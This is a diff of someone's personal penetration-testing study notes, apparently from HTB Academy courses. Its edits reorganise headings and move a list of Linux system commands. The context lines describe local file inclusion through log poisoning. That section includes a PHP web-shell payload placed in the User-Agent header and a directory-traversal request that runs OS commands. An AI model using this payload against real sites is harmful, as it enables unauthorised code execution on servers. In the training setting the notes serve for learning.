@@ -18,7 +18,7 @@ Lessons and Tutorials Covered
 
 
 
-### File Inclusion / Directory Traversal (HTB Academy)
+## File Inclusion / Directory Traversal (HTB Academy)
 Often see a parameter like /index.php?page=about. Under the hood, index.php will probably pull header.php, about.php, and footer.php. Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en; then the website will grab files from the /en/ directory.
 
 * RCE through PHP Session Files
@@ -80,10 +80,23 @@ Start Burp Suite, intercept a request to the page, and send it to Repeater. Next
 Poisoned user agent is visible in the included log file. Modify User-Agent to a PHP shell such as <?php system($_GET['cmd']); ?>
 We can now execute OS-level commands by adding a parameter to the GET request. ie GET website.php?page=../../logs.log&cmd=id (id can be any command)
 
+## Linux Fundermentals (HTB Academy)
+* System Info Commands
+> uname -a - shows OS version
+> id - returns users id
+apt-cache show impacket-scripts - show info about a package
+apt list --installed - show installed packages
+dpkg -l
+git clone https://github.com/craigrachow/OffSec/blob/main
+dpkg -i strace_4.21-1ubuntu1_amd64.deb - download and install a package
+ps -aux | grep ssh - check if a service is running
+systemctl list-units --type=service - list all service
+sudo updatedb && locate xx - looks for a file
+
 
 ### Metasploit
 
-# install searchsploit
+### install searchsploit
 sudo apt install exploitdb -y
 # scan for services 
 netcat 10.10.10.10 22
@@ -138,19 +151,6 @@ ssh user@10.10.10.10
 netcat 10.10.10.10 22
 
 
-Linux Fundermentals
-
-System Info
-uname -a - shows OS version
-id - returns users id
-apt-cache show impacket-scripts - show info about a package
-apt list --installed - show installed packages
-dpkg -l
-git clone https://github.com/craigrachow/OffSec/blob/main
-dpkg -i strace_4.21-1ubuntu1_amd64.deb - download and install a package
-ps -aux | grep ssh - check if a service is running
-systemctl list-units --type=service - list all service
-sudo updatedb && locate xx - looks for a file
 
 Windows Fundermentals
 Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber - get OS version number
